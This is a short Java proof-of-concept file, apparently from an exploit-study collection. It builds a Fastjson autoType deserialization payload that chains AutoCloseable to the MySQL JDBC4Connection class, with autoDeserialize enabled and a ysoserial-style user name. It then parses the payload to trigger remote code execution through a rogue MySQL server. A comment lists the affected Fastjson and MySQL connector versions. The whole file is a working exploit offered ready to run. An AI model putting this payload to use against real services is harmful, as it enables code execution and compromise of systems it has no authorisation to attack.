package test;

import com.alibaba.fastjson.JSON;

public class Fastjson13_mysql_2 {
  	//<=1.2.68 and mysql 5.1.1-5.1.49仅SSRF 5.1.11-5.1.48可反序列化 
    public static void main(String[] args) throws Exception{
        String payload = "{\r\n"
        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
        		+ "	\"@type\": \"com.mysql.jdbc.JDBC4Connection\",\r\n"
        		+ "	\"hostToConnectTo\": \"127.0.0.1\",\r\n"
        		+ "	\"portToConnectTo\": 3306,\r\n"
        		+ "	\"info\": {\r\n"
        		+ "		\"user\": \"yso_CommonsCollections4_calc\",\r\n"
        		+ "		\"password\": \"pass\",\r\n"
        		+ "		\"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\r\n"
        		+ "		\"autoDeserialize\": \"true\",\r\n"
        		+ "		\"NUM_HOSTS\": \"1\"\r\n"
        		+ "	},\r\n"
        		+ "	\"databaseToConnectTo\": \"dbname\",\r\n"
        		+ "	\"url\": \"\"\r\n"
        		+ "}\r\n"
        		+ "";
        System.out.println(payload);
    	JSON.parseObject(payload);
    }
}
